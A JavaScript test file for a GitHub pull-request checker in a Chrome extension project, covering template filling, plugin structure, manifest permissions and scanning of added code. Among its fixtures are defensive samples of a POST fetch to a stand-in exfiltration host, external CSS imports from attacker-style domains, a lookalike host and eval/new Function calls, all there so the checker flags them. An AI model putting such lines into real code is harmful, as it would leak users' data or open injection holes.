// node tests/pr-check.test.mjs
import assert from "node:assert/strict";
import fs from "node:fs";
import { checkBody, checkPluginSource, checkManifest, checkAddedLines, looksMinified, parseDiffAddedLines, createResults, renderReport, hostAllowed, findGlobalClashes, checkGlobalNames } from "../.github/scripts/pr-check.mjs";

const cases = [];
const test = (name, fn) => cases.push([name, fn]);
const rules = (r, level = "error") => r.items.filter((i) => i.level === level).map((i) => i.rule);

const template = fs.readFileSync(new URL("../.github/pull_request_template.md", import.meta.url), "utf8");
const checkAll = (text) => text.replace(/- \[ \]/g, "- [x]");

// a filled in body for the given type. replaces the template parts a contributor has to touch
function body({ type = "Bugfix", what = "Fixes #12: the toolbar vanished after a reload of the page.", reproduce = "Open an iFlow, reload, the toolbar is gone.", screenshot = "![after](https://github.com/user-attachments/assets/abc)", data = "no", tenant = "Cloud Foundry", browser = "Chrome" } = {}) {
  let text = template;
  text = text.replace(`- [ ] ${type}`, `- [x] ${type}`);
  text = text.replace(/## What and why\n/, `## What and why\n${what}\n`);
  text = text.replace(/## How to reproduce\n/, `## How to reproduce\n${reproduce}\n`);
  text = text.replace(/## Screenshots \/ GIF\n/, `## Screenshots / GIF\n${screenshot}\n`);
  if (data === "no") text = text.replace("- [ ] This PR sends **no data**", "- [x] This PR sends **no data**");
  if (data === "hosts") text = text.replace("- [ ] This PR sends data to", "- [x] This PR sends data to").replace("`host`: what, when", "`api.example.org`: the payload, on click");
  const [head, checklist] = text.split("## Checklist");
  return head + "## Checklist" + checkAll(checklist).replace("___ Browser(s): ___", `${tenant} Browser(s): ${browser}`);
}

const ctx = { productChanged: true, coreChanged: true, uiChanged: "scripts/x.js" };

// ------------------------------------------------------------ body

test("body: empty description means the template is not used", () => {
  const r = createResults();
  checkBody("", ctx, r);
  assert.deepEqual(rules(r), ["template"]);
});

test("body: the unchanged template fails on type, text, screenshots, data flow and checklist", () => {
  const r = createResults();
  checkBody(template, ctx, r);
  const found = new Set(rules(r));
  for (const rule of ["type", "template", "screenshots", "data-flow", "checklist"]) assert.ok(found.has(rule), rule);
});

test("body: a complete bugfix passes", () => {
  const r = createResults();
  checkBody(body(), ctx, r);
  assert.deepEqual(r.items, []);
});

test("body: bugfix without reproduction steps fails", () => {
  const r = createResults();
  checkBody(body({ reproduce: "n/a" }), ctx, r);
  assert.deepEqual(rules(r), ["reproduce"]);
});

test("body: core feature without issue fails, with issue passes", () => {
  const r = createResults();
  checkBody(body({ type: "Core feature or improvement", what: "Adds a dark mode toggle to the toolbar for everybody." }), ctx, r);
  assert.deepEqual(rules(r), ["issue"]);
  const ok = createResults();
  checkBody(body({ type: "Core feature or improvement", what: "Adds a dark mode toggle, see https://github.com/dbeck121/CPI-Helper-Chrome-Extension/issues/400" }), ctx, ok);
  assert.deepEqual(rules(ok), []);
});

test("body: two types checked fails", () => {
  const r = createResults();
  checkBody(body().replace("- [ ] New plugin", "- [x] New plugin"), ctx, r);
  assert.ok(rules(r).includes("type"));
});

test("body: docs only with product files fails", () => {
  const r = createResults();
  checkBody(body({ type: "Docs, tests or tooling only", reproduce: "n/a" }), ctx, r);
  assert.ok(rules(r).includes("type"));
});

test("body: docs only does not need the changelog box or a screenshot", () => {
  const r = createResults();
  const text = body({ type: "Docs, tests or tooling only", reproduce: "n/a", screenshot: "No UI change" }).replace("- [x] Changelog line", "- [ ] Changelog line");
  checkBody(text, { productChanged: false, coreChanged: false }, r);
  assert.deepEqual(r.items, []);
});

test("body: no screenshot fails, 'No UI change' passes with a warning on UI files", () => {
  const r = createResults();
  checkBody(body({ screenshot: "" }), ctx, r);
  assert.deepEqual(rules(r), ["screenshots"]);
  const ok = createResults();
  checkBody(body({ screenshot: "No UI change" }), ctx, ok);
  assert.deepEqual(rules(ok), []);
  assert.deepEqual(rules(ok, "warning"), ["screenshots"]);
});

test("body: both or no data flow box fails, hosts need a listed host", () => {
  const none = createResults();
  checkBody(body({ data: "none" }), ctx, none);
  assert.deepEqual(rules(none), ["data-flow"]);
  const hosts = createResults();
  checkBody(body({ data: "hosts" }), ctx, hosts);
  assert.deepEqual(rules(hosts), []);
  const unlisted = createResults();
  checkBody(body().replace("- [x] This PR sends **no data**", "- [ ] This PR sends **no data**").replace("- [ ] This PR sends data to", "- [x] This PR sends data to"), ctx, unlisted);
  assert.deepEqual(rules(unlisted), ["data-flow"]);
});

test("body: removed checklist items fail when the template is known", () => {
  const r = createResults();
  checkBody(body().replace(/- \[x\] No minified[^\n]*\n/, ""), { ...ctx, templateText: template }, r);
  assert.deepEqual(rules(r), ["checklist"]);
  const ok = createResults();
  checkBody(body(), { ...ctx, templateText: template }, ok);
  assert.deepEqual(ok.items, []);
});

test("body: tenant and browser placeholders must be filled", () => {
  const r = createResults();
  checkBody(body().replace("Cloud Foundry Browser(s): Chrome", "___ Browser(s): ___"), ctx, r);
  assert.deepEqual(rules(r), ["checklist"]);
});

test("body: plugin checklist only counts when plugins changed, core checklist only for core", () => {
  const text = body().replace(/(Plugins only\n)- \[x\]/, "$1- [ ]");
  const r = createResults();
  checkBody(text, ctx, r);
  assert.deepEqual(rules(r), []);
  const p = createResults();
  checkBody(text, { ...ctx, pluginChanged: true }, p);
  assert.deepEqual(rules(p), ["checklist"]);
  const core = body().replace(/(Core changes only[^\n]*\n)- \[x\]/, "$1- [ ]");
  const c = createResults();
  checkBody(core, { ...ctx, coreChanged: false }, c);
  assert.deepEqual(rules(c), []);
});

// ------------------------------------------------------------ plugins

const goodPlugin = `var plugin = {
  metadataVersion: "1.0.0",
  id: "good",
  name: "Good",
  version: "1.0.0",
  author: "Me",
  email: "me@example.com",
  website: "https://example.com",
  description: "does things",
  state: { list: [] },
  messageSidebarContent: {
    onRender: (pluginHelper, settings) => {
      const div = document.createElement("div");
      document.addEventListener("click", () => {});
      return div;
    },
  },
};

pluginList.push(plugin);
`;

test("plugin: only the plugin object and push pass", () => {
  const r = createResults();
  checkPluginSource("plugins/good.js", goodPlugin, r);
  assert.deepEqual(r.items, []);
});

test("plugin: top-level listener, function and variable fail", () => {
  const r = createResults();
  checkPluginSource("plugins/good.js", `var helper = 1;\nfunction x() {}\nwindow.addEventListener("click", () => {});\n` + goodPlugin, r);
  assert.deepEqual(rules(r), ["plugin-top-level", "plugin-top-level", "plugin-top-level"]);
  assert.deepEqual(r.items.map((i) => i.line), [1, 2, 3]);
});

test("plugin: code in the object that runs on load fails", () => {
  const r = createResults();
  checkPluginSource("plugins/good.js", goodPlugin.replace("state: { list: [] },", "state: (() => setInterval(() => {}, 1000))(),\n  el: document.querySelector('x'),"), r);
  assert.deepEqual(rules(r), ["plugin-load-time", "plugin-load-time"]);
});

test("plugin: id has to match the file name, name/author/description are required", () => {
  const r = createResults();
  checkPluginSource("plugins/other.js", goodPlugin.replace('author: "Me",', ""), r);
  assert.deepEqual(rules(r).sort(), ["plugin-metadata", "plugin-metadata"]);
});

test("plugin: syntax error is reported", () => {
  const r = createResults();
  checkPluginSource("plugins/good.js", "var plugin = {", r);
  assert.deepEqual(rules(r), ["plugin"]);
});

test("plugin: example.js and plugins without top-level code pass, unlock.js does not", () => {
  const read = (name) => fs.readFileSync(new URL(`../plugins/${name}`, import.meta.url), "utf8");
  const example = createResults();
  checkPluginSource("plugins/exampleid1.js", read("example.js"), example);
  assert.deepEqual(rules(example), []);
  const unlock = createResults();
  checkPluginSource("plugins/unlock.js", read("unlock.js"), unlock);
  assert.ok(rules(unlock).includes("plugin-top-level"));
});

test("plugin: violations that existed before the PR are warnings, new ones errors", () => {
  const before = `var helper = 1;\n` + goodPlugin.replace('id: "good"', 'id: "legacy_id"');
  const after = `var helper = 1;\nwindow.addEventListener("x", () => {});\n` + goodPlugin.replace('id: "good"', 'id: "legacy_id"');
  const r = createResults();
  checkPluginSource("plugins/good.js", after, r, before);
  assert.deepEqual(rules(r), ["plugin-top-level"]);
  assert.equal(r.items.find((i) => i.level === "error").line, 2);
  assert.deepEqual(rules(r, "warning"), ["plugin-legacy"]);
});

test("plugin: a wrapper that only declares and registers passes", () => {
  const helpers = `"use strict";\nconst LIMIT = 10;\nlet cache = null;\nconst months = { jan: 0 };\nfunction format(text) { return document.title + text; }\n`;
  for (const wrap of [(body) => `(() => {\n${body}})();`, (body) => `(function () {\n${body}})();`, (body) => `(function () {\n${body}}());`]) {
    const r = createResults();
    checkPluginSource("plugins/good.js", wrap(helpers + goodPlugin.replace("var plugin", "const plugin")), r);
    assert.deepEqual(rules(r), [], wrap("x"));
  }
});

test("plugin: code that runs inside the wrapper fails", () => {
  for (const line of ['window.addEventListener("x", () => {});', "const observer = new MutationObserver(() => {});", "setInterval(() => {}, 1000);", "const data = chrome.storage.local.get();", "if (location.href) {}", "class Sorter {}"]) {
    const r = createResults();
    checkPluginSource("plugins/good.js", `(() => {\n${line}\n${goodPlugin}})();`, r);
    assert.equal(rules(r).length, 1, line);
    assert.equal(r.items.find((i) => i.level === "error").line, 2, line);
  }
});

test("plugin: wrapper with arguments, a second wrapper or a missing push fails", () => {
  const withArgs = createResults();
  checkPluginSource("plugins/good.js", `((w) => {\n${goodPlugin}})(window);`, withArgs);
  assert.ok(rules(withArgs).includes("plugin-top-level"));
  const twice = createResults();
  checkPluginSource("plugins/good.js", `(() => {\n${goodPlugin}})();\n(() => {})();`, twice);
  assert.deepEqual(rules(twice), ["plugin-top-level"]);
  const noPush = createResults();
  checkPluginSource("plugins/good.js", `(() => {\n${goodPlugin.replace("pluginList.push(plugin);", "")}})();`, noPush);
  assert.deepEqual(rules(noPush), ["plugin"]);
});

// ------------------------------------------------------------ global names

test("global names: const after function fails, function after function warns, plugin and wrappers are fine", () => {
  const files = [
    { file: "plugins/a.js", source: "function escapeHtml() {}\nfunction wait() {}\nvar plugin = {};" },
    { file: "plugins/b.js", source: "const escapeHtml = () => 1;\nvar plugin = {};" },
    { file: "plugins/c.js", source: "function wait() {}\n(() => { const escapeHtml = 1; const plugin = {}; })();" },
  ];
  const clashes = findGlobalClashes(files);
  assert.deepEqual(clashes.map((c) => [c.name, c.second, c.fatal]), [["escapeHtml", "plugins/b.js", true], ["wait", "plugins/c.js", false]]);
});

test("global names: only clashes the PR adds are reported", () => {
  const base = [{ file: "scripts/x.js", source: "function old() {}" }, { file: "plugins/a.js", source: "function old() {}" }];
  const head = [...base, { file: "plugins/b.js", source: "let fresh = 1;" }, { file: "plugins/c.js", source: "let fresh = 2;" }];
  const r = createResults();
  checkGlobalNames(base, head, r);
  assert.deepEqual(rules(r), ["global-clash"]);
  assert.deepEqual(rules(r, "warning"), []);
});

// ------------------------------------------------------------ manifest

const manifest = {
  permissions: ["storage"],
  host_permissions: ["https://*.hana.ondemand.com/itspaces"],
  content_scripts: [{ matches: ["https://*.hana.ondemand.com/*"], js: ["/plugins/a.js"], css: ["/css/a.css"] }],
  web_accessible_resources: [{ resources: ["images/*"], matches: ["<all_urls>"] }],
};
const changedManifest = (fn) => {
  const copy = structuredClone(manifest);
  fn(copy);
  return JSON.stringify(copy);
};

test("manifest: a new plugin in content_scripts passes", () => {
  const r = createResults();
  checkManifest(JSON.stringify(manifest), changedManifest((m) => m.content_scripts[0].js.push("/plugins/b.js")), r);
  assert.deepEqual(r.items, []);
});

test("manifest: new permission, host permission, resource or main world fail", () => {
  for (const change of [(m) => m.permissions.push("tabs"), (m) => m.host_permissions.push("<all_urls>"), (m) => m.web_accessible_resources[0].resources.push("x.js"), (m) => (m.content_scripts[0].world = "MAIN")]) {
    const r = createResults();
    checkManifest(JSON.stringify(manifest), changedManifest(change), r);
    assert.deepEqual(rules(r), ["manifest"]);
  }
});

// ------------------------------------------------------------ added lines

const lines = (...texts) => texts.map((line, i) => ({ line, number: i + 1 }));

test("lines: eval, new Function and string timers fail, comments are ignored", () => {
  const r = createResults();
  checkAddedLines("scripts/x.js", lines("eval(code);", "const f = new Function('a', b);", 'setTimeout("run()", 10);', "// eval(code)"), {}, r);
  assert.deepEqual(rules(r), ["security", "security", "security"]);
});

test("lines: external request fails when the PR claims no data, else warns", () => {
  const code = lines('fetch("https://api.evil.io/collect", { method: "POST" });');
  const strict = createResults();
  checkAddedLines("plugins/x.js", code, { noDataClaimed: true }, strict);
  assert.deepEqual(rules(strict), ["data-flow"]);
  const loose = createResults();
  checkAddedLines("plugins/x.js", code, { noDataClaimed: false }, loose);
  assert.deepEqual(rules(loose, "warning"), ["data-flow"]);
});

test("lines: tenant and known hosts are fine", () => {
  const r = createResults();
  checkAddedLines("scripts/x.js", lines('fetch("https://abc.it-cpi001.cfapps.eu10.hana.ondemand.com/api/v1");', 'a.href = "https://github.com/dbeck121";'), { noDataClaimed: true }, r);
  assert.deepEqual(r.items, []);
  assert.equal(hostAllowed("evilhana.ondemand.com.attacker.io"), false);
});

test("lines: innerHTML with variables and secrets in sync storage warn", () => {
  const r = createResults();
  checkAddedLines("plugins/x.js", lines("div.innerHTML = `<b>${name}</b>`;", 'div.innerHTML = "<b>static</b>";', "chrome.storage.sync.set({ apiToken: token });", 'key: { text: "API Key", type: "textinput", scope: "browser" },'), {}, r);
  assert.deepEqual(rules(r, "warning"), ["xss", "secrets", "secrets"]);
});

test("lines: external urls in css fail, own files pass", () => {
  const r = createResults();
  checkAddedLines("css/plugin.css", lines('@import url("https://fonts.evil.io/x.css");', ".a { background: url(//cdn.evil.io/a.png); }", '.b { background: url("/images/a.png"); }'), {}, r);
  assert.deepEqual(rules(r), ["data-flow", "data-flow"]);
});

test("lines: only code files are scanned", () => {
  const r = createResults();
  checkAddedLines("README.md", lines("eval(x)", "https://api.evil.io"), { noDataClaimed: true }, r);
  assert.deepEqual(r.items, []);
});

// ------------------------------------------------------------ misc

test("minified: long lines and .min files are detected, normal code is not", () => {
  assert.equal(looksMinified("scripts/a.min.js", "x"), true);
  assert.equal(looksMinified("scripts/a.js", "a".repeat(1200)), true);
  assert.equal(looksMinified("scripts/a.js", "const a = 1;\n".repeat(400)), false);
  assert.equal(looksMinified("scripts/plugins.js", fs.readFileSync(new URL("../scripts/plugins.js", import.meta.url), "utf8")), false);
});

test("diff: added lines get the line numbers of the new file", () => {
  const diff = ["diff --git a/x.js b/x.js", "--- a/x.js", "+++ b/x.js", "@@ -3,0 +4,2 @@", "+one", "+two", "@@ -10 +12 @@", "-old", "+new", "--- a/gone.js", "+++ /dev/null", "@@ -1 +0,0 @@", "-x"].join("\n");
  const files = parseDiffAddedLines(diff);
  assert.deepEqual(files.get("x.js"), [
    { line: "one", number: 4 },
    { line: "two", number: 5 },
    { line: "new", number: 12 },
  ]);
  assert.equal(files.has("gone.js"), false);
});

test("report: mentions are defused and errors listed first", () => {
  const r = createResults();
  r.warn("x", "ping @someone");
  r.error("y", "broken", "a.js", 3);
  const report = renderReport({ items: r.items, overridden: false });
  assert.ok(report.indexOf("Must be fixed") < report.indexOf("Please check"));
  assert.ok(!report.includes("@someone"));
  assert.ok(report.includes("`a.js:3`"));
});

test("report: overridden errors get their own section, real warnings stay apart", () => {
  const items = [
    { level: "warning", rule: "template", message: "not used", overridden: true },
    { level: "warning", rule: "plugin-metadata", message: "no email", file: "plugins/a.js", line: 5 },
  ];
  const report = renderReport({ items, overridden: true });
  assert.ok(report.includes("**Passed by maintainer override:** 1 problem(s)"));
  assert.ok(!report.includes("No blocking problems"));
  const accepted = report.indexOf("### Accepted by maintainer override");
  const check = report.indexOf("### Please check");
  assert.ok(accepted > 0 && check > accepted);
  assert.ok(report.slice(accepted, check).includes("**template**"));
  assert.ok(report.slice(check).includes("**plugin-metadata**"));
});

let failed = 0;
for (const [name, fn] of cases) {
  try {
    fn();
    console.log(`ok   ${name}`);
  } catch (error) {
    failed++;
    console.log(`FAIL ${name}\n${error.stack}`);
  }
}
console.log(`\n${cases.length - failed}/${cases.length} passed`);
process.exit(failed ? 1 : 0);
